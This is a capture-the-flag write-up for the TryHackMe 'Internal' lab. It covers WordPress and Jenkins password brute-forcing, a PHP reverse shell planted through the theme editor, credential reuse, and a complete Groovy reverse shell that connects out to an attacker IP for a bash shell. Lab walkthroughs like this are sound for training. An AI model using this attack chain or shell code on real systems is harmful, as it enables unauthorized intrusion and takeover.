# TryHackMe: Internal Writeup

**Room Link:** [Internal](https://tryhackme.com/room/internal)

---

## Initial Enumeration

Add the target to `/etc/hosts`:

```bash
sudo mousepad /etc/hosts
# 10.146.146.90  internal.thm
```

Nmap scan:

```bash
nmap internal.thm
```

**Results:**
```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

The web root has nothing interesting. `subfinder` finds no subdomains, but `gobuster` reveals hidden directories:

```bash
gobuster dir -u http://internal.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Results:**
```text
blog                 (Status: 301)
wordpress            (Status: 301)
javascript           (Status: 301)
phpmyadmin           (Status: 301)
```

## WordPress Enumeration

`/blog` is a WordPress site. Running `wpscan`:

```bash
wpscan --url http://internal.thm/blog/ --api-token <token> --detection-mode aggressive --plugins-detection aggressive
```

`/phpmyadmin` is running version 4.6.6, which historically had CVEs such as [CVE-2016-6621](https://www.cve.org/CVERecord?id=CVE-2016-6621) and [CVE-2017-1000017](https://nvd.nist.gov/vuln/detail/CVE-2017-18264).

Enumerate WordPress users:

```bash
wpscan --url http://internal.thm/blog -e u
```

This reveals a user named `admin`. Brute forcing the password:

```bash
wpscan --url http://internal.thm/blog \
  -U admin \
  -P /usr/share/wordlists/rockyou.txt
```

**Result:**
```text
[SUCCESS] - admin / my2boys
```

Credentials obtained: `admin:my2boys`

Inside the WordPress admin panel, there is an unpublished private blog post with credentials:

```text
To-Do
Don't forget to reset Will's credentials. william:arnold147
```

These credentials didn't work on SSH, WordPress, or phpMyAdmin.

## Initial Access via WordPress Theme Editor

Using the `admin` account, navigate to **Appearance -> Edit Themes** and edit `404.php`, replacing its contents with a PHP reverse shell.

Start a listener:

```bash
nc -lnvp 4444
```

Trigger the shell by visiting:

```text
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
```

We land a shell as `www-data`.

## Lateral Movement to aubreanna

There is a user `aubreanna` on the box, but the home directory isn't readable yet. Looking around `/opt`:

```bash
www-data@internal:/$ ls /opt
containerd  wp-save.txt
www-data@internal:/$ cat /opt/wp-save.txt
```

**Result:**
```text
Bill,
Aubreanna needed these credentials for something later. Let her know you have them and where they are.
aubreanna:bubb13guM!@#123
```

SSH in as `aubreanna`:

```bash
ssh aubreanna@internal.thm
cat user.txt
```

Flag obtained (redacted — solve the room to get the exact value).

## Privilege Escalation Path: aubreanna -> Jenkins

Running `linpeas.sh` as `aubreanna` reveals database credentials in config files:

```text
/etc/wordpress/config-localhost.php:define('DB_PASSWORD', 'wordpress123');
/etc/wordpress/config-localhost.php:define('DB_USER', 'wordpress');
```

These credentials (`wordpress:wordpress123`) work against `/phpmyadmin`.

`aubreanna`'s home directory also contains `jenkins.txt`:

```bash
cat jenkins.txt
```

**Result:**
```text
Internal Jenkins service is running on 172.17.0.2:8080
```

Jenkins is only reachable internally, so set up an SSH tunnel (and a remote forward, needed later for callback reachability):

```bash
ssh -L 1234:172.17.0.2:8080 -R 8080:127.0.0.1:80 aubreanna@internal.thm
```

### Brute Forcing Jenkins Login

Brute force the login using the default `admin` username:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 1234 http-post-form \
  "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
```

**Password found:** `spongebob`

### RCE via Jenkins Script Console

With valid Jenkins admin credentials, navigate to **Manage Jenkins -> Script Console** and run a Groovy reverse shell:

```groovy
String host="192.168.138.49";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();Thread.sleep(50);
  try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();s.close();
```

This gives a reverse shell as the `jenkins` user.

## Privilege Escalation: jenkins -> root

Checking `/opt` as the `jenkins` user:

```bash
ls /opt
cat /opt/note.txt
```

This reveals the root credentials:

```text
tr0ub13guM!@#123
```

Using these credentials to switch to root completes the box.
